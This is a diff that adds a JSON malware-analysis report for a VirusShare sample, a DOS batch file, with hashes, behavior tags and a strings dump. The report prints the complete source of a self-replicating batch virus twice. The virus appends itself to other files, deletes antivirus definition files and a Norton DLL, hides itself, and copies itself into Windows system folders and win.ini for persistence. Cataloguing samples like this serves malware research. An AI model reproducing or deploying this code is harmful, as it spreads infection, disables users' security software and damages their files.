@@ -1,0 +1,74 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "command": "May run PowerShell commands",
+            "system": "May run an executable file or a system command on a Mac",
+            "windows": "May enumerate application windows"
+        },
+        "macro": "@echo off %SeX%\n@ctty nul\nattrib SeX.bat +h\nif \"%1==\"$ goto $infect\ndel c:\\windows\\sento\\*.*\nif not errorlevel 1 goto $antiav\nif \"%1==\"$ goto $hiding\nif \"%1==\"$ goto $msg\n@exit\n:$infect\nfind \"_\"<%2>nul\nif not errorlevel 1 goto end\necho.>>%2\necho>>%2 @rem SeX by Dr Virus Quest\nren %2 %p%%2\ncopy %0 %2\n:$antiav\ndel c:\\progra~1\\antivi~1\\*.avc\ndel c:\\progra~1\\norton~1\\s32integ.dll\ncopy SeX.bat c:\\windows\\system\ncopy SeX.bat c:\\windows\\system32\ncopy SeX.bat + c:\\windows\\win.ini c:\\windows\\system\\win.ini\ndel c:\\windows\\win.ini\nmove c:\\windows\\system\\win.ini c:\\windows\n:$msg\n@echo off\n@echo SeX iS sO gOoD~!\n@echo lEt'S hAvE sEx ToGeThEr~!\n@echo - Dr Virus Quest\n:hiding\ncopy SeX.bat c:\\windows\ncopy SeX.bat c:\\windows\\Temp\ncopy SeX.bat c:\\windows\\SendTo\ncopy SeX.bat c:\\windows\\command\\\ncopy SeX.bat c:\\windows\\fonts\ncopy SeX.bat c:\\mydocu~1\n:end"
+    },
+    "filename": "VirusShare_29de20b871ff6dc05e038e29ea544369",
+    "filesize": 882,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "29de20b871ff6dc05e038e29ea544369",
+        "sha1": "3d92300aba66fdc70bcc37732e827f960cfad605",
+        "sha256": "3a238abb2de62d9b91e07c5fd97b833dbe0ba731d35e83f232d324267df1c64c"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off %SeX%",
+            "@ctty nul",
+            "attrib SeX.bat +h",
+            "if \"%1==\"$ goto $infect",
+            "del c:\\windows\\sento\\*.*",
+            "if not errorlevel 1 goto $antiav",
+            "if \"%1==\"$ goto $hiding",
+            "if \"%1==\"$ goto $msg",
+            "@exit",
+            ":$infect",
+            "find \"_\"<%2>nul",
+            "if not errorlevel 1 goto end",
+            "echo.>>%2",
+            "echo>>%2 @rem SeX by Dr Virus Quest",
+            "ren %2 %p%%2",
+            "copy %0 %2",
+            ":$antiav",
+            "del c:\\progra~1\\antivi~1\\*.avc",
+            "del c:\\progra~1\\norton~1\\s32integ.dll",
+            "copy SeX.bat c:\\windows\\system",
+            "copy SeX.bat c:\\windows\\system32",
+            "copy SeX.bat + c:\\windows\\win.ini c:\\windows\\system\\win.ini",
+            "del c:\\windows\\win.ini",
+            "move c:\\windows\\system\\win.ini c:\\windows",
+            ":$msg",
+            "@echo off",
+            "@echo SeX iS sO gOoD~!",
+            "@echo lEt'S hAvE sEx ToGeThEr~!",
+            "@echo - Dr Virus Quest",
+            ":hiding",
+            "copy SeX.bat c:\\windows",
+            "copy SeX.bat c:\\windows\\Temp",
+            "copy SeX.bat c:\\windows\\SendTo",
+            "copy SeX.bat c:\\windows\\command\\",
+            "copy SeX.bat c:\\windows\\fonts",
+            "copy SeX.bat c:\\mydocu~1",
+            ":end"
+        ],
+        "file": {
+            "del c:\\progra~1\\norton~1\\s32integ.dll": "Library"
+        },
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.269597",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
